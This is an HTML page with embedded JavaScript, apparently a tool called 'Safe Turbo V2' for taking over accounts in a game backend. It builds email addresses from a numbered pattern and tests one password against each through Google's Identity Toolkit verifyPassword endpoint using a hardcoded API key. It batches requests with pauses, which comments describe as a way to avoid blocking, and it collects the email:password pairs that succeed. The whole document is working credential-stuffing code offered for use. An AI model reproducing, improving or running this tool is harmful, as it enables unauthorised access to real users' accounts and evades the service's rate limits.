<!DOCTYPE html>
<html>
<head>
    <title>CPM Safe Turbo</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #050505; color: #fff; font-family: sans-serif; text-align: center; padding: 15px; }
        .box { max-width: 500px; margin: auto; background: #111; padding: 20px; border-radius: 15px; border: 1px solid #00ffcc; box-shadow: 0 0 20px rgba(0,255,204,0.1); }
        h2 { color: #00ffcc; letter-spacing: 1px; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin: 8px 0; background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 8px; box-sizing: border-box; outline: none; }
        .btn-start { width: 100%; padding: 15px; background: #00ffcc; color: #000; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .stats { display: flex; justify-content: space-around; margin: 20px 0; background: #000; padding: 15px; border-radius: 10px; border: 1px solid #222; }
        .stats b { font-size: 20px; color: #00ffcc; display: block; }
        #res { width: 100%; height: 200px; background: #000; color: #00ff00; border: 1px solid #00ffcc; border-radius: 5px; padding: 10px; font-family: monospace; font-size: 13px; margin-top: 10px; box-sizing: border-box; }
        .status-msg { font-size: 10px; color: #888; margin-top: 5px; }
    </style>
</head>
<body>

<div class="box">
    <h2>🛡️ SAFE TURBO V2</h2>
    <input type="text" id="fmt" placeholder="Format: test_{4}_@gmail.com">
    <input type="text" id="pwd" placeholder="Password">
    
    <button class="btn-start" id="btn" onclick="startSafeScan()">⚡ START SAFE SCAN</button>

    <div class="stats">
        <div>CHECKED<b id="c">0</b></div>
        <div>FOUND<b id="f">0</b></div>
    </div>

    <div id="status" class="status-msg">Ready to scan...</div>
    <textarea id="res" readonly placeholder="Result: Email:Pass"></textarea>
    
    <button onclick="copyAll()" style="width:100%; background:#222; color:#00ffcc; border:1px solid #00ffcc; padding:10px; margin-top:10px; cursor:pointer; border-radius:5px;">📋 COPY RESULTS</button>
</div>

<script>
    let running = false;
    let checked = 0;
    let found = 0;
    let idx = 0;

    async function startSafeScan() {
        if (running) { location.reload(); return; }
        
        let fmt = document.getElementById('fmt').value.trim();
        let pwd = document.getElementById('pwd').value.trim();
        let key = "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ";

        if (!fmt.includes('{') || !pwd) return alert("Fill all fields!");

        running = true;
        document.getElementById('btn').innerText = "🛑 STOP SCAN";
        document.getElementById('btn').style.background = "#ff4444";
        
        let digits = fmt.match(/\{(\d+)\}/)[1];
        let max = Math.pow(10, digits);

        // --- ANTI-BLOCK BATCH LOGIC ---
        while (running && idx < max) {
            let batchSize = 35; // ഒരേസമയം 35 എണ്ണം വീതം
            let promises = [];

            document.getElementById('status').innerText = "Batch checking: " + idx + " to " + (idx + batchSize);

            for (let i = 0; i < batchSize && idx < max; i++) {
                let num = idx.toString().padStart(digits, '0');
                let email = fmt.replace(/\{(\d+)\}/, num);
                promises.push(check(email, pwd, key));
                idx++;
            }

            await Promise.all(promises);
            checked = idx;
            document.getElementById('c').innerText = checked;

            // ഓരോ ബാച്ച് കഴിയുമ്പോഴും 800ms ഗ്യാപ്പ് (ബ്ലോക്ക് ആവാതിരിക്കാൻ)
            await new Promise(r => setTimeout(r, 800));
        }
    }

    async function check(em, pw, k) {
        try {
            let r = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${k}`, {
                method: 'POST',
                body: JSON.stringify({ email: em, password: pw, returnSecureToken: true }),
                headers: { 'Content-Type': 'application/json' }
            });
            let d = await r.json();
            if (d && d.idToken) {
                found++;
                document.getElementById('f').innerText = found;
                document.getElementById('res').value += em + ":" + pw + "\n";
                document.getElementById('res').scrollTop = document.getElementById('res').scrollHeight;
            }
        } catch (e) {}
    }

    function copyAll() {
        let area = document.getElementById('res');
        area.select();
        document.execCommand('copy');
        alert("Copied!");
    }
</script>

</body>
</html>
